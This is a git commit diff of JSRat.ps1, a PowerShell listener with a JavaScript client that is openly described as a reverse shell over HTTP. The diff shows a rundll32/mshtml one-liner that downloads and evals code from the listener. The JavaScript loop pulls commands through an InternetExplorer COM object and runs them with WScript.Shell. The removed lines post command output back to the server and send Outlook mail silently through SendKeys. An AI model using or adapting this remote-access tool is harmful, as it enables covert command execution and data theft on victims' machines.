3937c8c50f0920732c592c21e3a1e91d1b9e90f3
Casey Smith <netsmith@gmail.com>
2015-12-16 13:19:29 -0700

    Update JSRat.ps1

--- JSRat.ps1
+++ JSRat.ps1
@@ -8,14 +8,13 @@
   
   Simple Reverse Shell over HTTP. Execute Commands on Client.  
   
-  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/connect",false);h.Send();B=h.ResponseText;eval(B)
+  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();ie=new%20ActiveXObject("InternetExplorer.Application");ie.Navigate("http://127.0.0.1/connect");while(ie.ReadyState!=4){a=1;}s=ie.document.body.innerText;eval(s);
   
   Listening Server IP Address
   
 #>
 
 $Server = '127.0.0.1' #Listening IP. Change This.
-$EmailRecipient = "user@example.com"
 
 
 function Receive-Request {
@@ -46,62 +45,20 @@ while ($true) {
     $request = $context.Request
     $response = $context.Response
 	$hostip = $request.RemoteEndPoint
-	$i = $true
+	$init = $true
 	#Use this for One-Liner Start
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
      write-host "Host Connected" -fore Cyan
         $message = '
-					function stringStartsWith (string, prefix) {
-					return string.slice(0, prefix.length) == prefix;
-					}
-					
-					function SendMail(to,body,sub) {
-						var theApp    //Reference to Outlook.Application
-						var theMailItem   //Outlook.mailItem
-						//Attach Files to the email, Construct the Email including     
-						//To(address),subject,body
-						var subject = sub
-						var msg = body
-						//Create a object of Outlook.Application
-						try
-						{
-						var theApp = new ActiveXObject("Outlook.Application")
-						var theMailItem = theApp.CreateItem(0) // value 0 = MailItem
-						  //Bind the variables with the email
-						  theMailItem.to = to
-						  theMailItem.Subject = (subject);
-						  theMailItem.Body = (msg);
-						  
-						  //Show the mail before sending for review purpose
-						  //You can directly use the theMailItem.send() function
-						  //This Sends Email without Prompt. *grin*
-						  theMailItem.display();
-						  var Shell = new ActiveXObject( "WScript.Shell" ); 
-						  Shell.AppActivate("Outlook");
-						  Shell.SendKeys( "%s" );
-						  }
-						catch(err)
-						{
-
-						}
-					}
-					
 					while(true)
 					{
-						
-						h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-						h.Open("GET","http://'+$Server+'/rat",false);
-						h.Send();
-						c = h.ResponseText;
-						if(c == "sleep" || c=="") { for (var i=0;i<10000;i++){} continue; }
-						if(c == "mail") { SendMail("'+$EmailRecipient+'","Yup Its Alive","Important"); continue}
-						if(stringStartsWith(c,"#")){ while(c.charAt(0) == "#"){s=c.substr(1);eval(s);break;} continue;}
-						r = new ActiveXObject("WScript.Shell").Exec(c);
-						var so;
-						while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
-						p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-						p.Open("POST","http://'+$Server+'/rat",false);
-						p.Send(so);
+						var ie = new ActiveXObject("InternetExplorer.Application");						
+						ie.Navigate('''+$Server+'/rat'');
+						while(ie.ReadyState!=4){a=1;};
+						var c = ie.document.body.innerText;
+						var r = new ActiveXObject("WScript.Shell");
+						r.Exec(c);
+						ie.Quit();
 					}
 					
 		'
@@ -112,7 +69,9 @@ while ($true) {
 		Receive-Request($request)	
 	}
     if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
-        $message = Read-Host "JS $hostip>"		
+        $message = Read-Host "JS $hostip>"
+		
+		
     }
     
 
